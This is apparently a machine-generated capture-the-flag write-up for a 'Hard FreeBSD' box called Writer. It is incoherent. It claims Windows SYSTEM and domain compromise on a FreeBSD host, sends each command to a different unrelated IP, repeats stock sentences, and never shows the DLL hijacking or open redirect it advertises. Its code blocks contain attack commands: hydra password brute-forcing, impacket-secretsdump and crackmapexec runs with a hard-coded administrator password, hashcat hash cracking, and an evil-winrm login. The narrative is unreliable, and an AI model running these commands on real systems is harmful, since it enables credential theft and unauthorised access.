---
TitleSEO: "PwnTillDawn — Writer (Hard FreeBSD) | ZureFX"
TitlePost: "PwnTillDawn — Writer (Hard FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Writer. DLL Hijacking and Open Redirect to achieve hard compromise on FreeBSD."
Keywords: "easy, insane, hard, medium, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-writer-889.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-writer-889/"
Date: "2025-06-22"
Tags: "Easy, Insane, Hard, Medium, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-writer-889"
Permalink: "/writeups/htb-writer-889.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Writer** is rated **Hard** on PwnTillDawn. It runs **FreeBSD** and the IP address during this analysis was `10.122.162.38`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.28.20.32 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.121.99.68 -u administrator -p 'P@ssw0rd!'
```

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.80.35.47 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p135,636,1521 10.97.223.126 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.39.160.46
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

### SMB Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.16.192.131/FUZZ
```

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target.

Key finding: **ACL Abuse**.

The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation.

### Initial Access

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

```bash
crackmapexec smb 10.75.32.140 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p53,5986,995 10.52.193.242 -oN scan.txt
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
crackmapexec smb 10.59.193.128 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.89.54.18 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.34.90.231 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.55.3.52 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.96.144.106/FUZZ
gobuster dir -u http://10.55.80.10/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.20.217.167/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Summary

### Tools Used

- `msfvenom`
- `sharphound`
- `impacket`
- `nmap`

### Key Takeaways

- DLL Hijacking
- Open Redirect
- Remote File Inclusion
- ACL Abuse
